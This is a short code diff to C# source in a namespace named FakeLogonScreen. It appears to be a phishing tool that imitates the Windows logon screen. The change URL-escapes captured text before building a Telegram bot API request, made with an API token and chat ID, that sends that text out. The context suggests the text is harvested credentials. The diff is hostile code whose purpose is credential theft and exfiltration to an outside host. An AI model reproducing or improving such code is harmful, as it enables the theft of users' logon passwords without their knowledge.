@@ -6,6 +6,7 @@ using System.Windows.Forms;
 using System.IO;
 using System.Drawing;
 using System.Net;
+using System.Web;
 
 /*
 Author: @bitsadmin
@@ -44,6 +45,7 @@ namespace FakeLogonScreen
         {
             ServicePointManager.Expect100Continue = true;
             ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+            text = Uri.EscapeDataString(text);
             string urlString = $"https://api.telegram.org/bot{apilToken}/sendMessage?chat_id={destID}&text={text}";
 
             WebClient webclient = new WebClient();
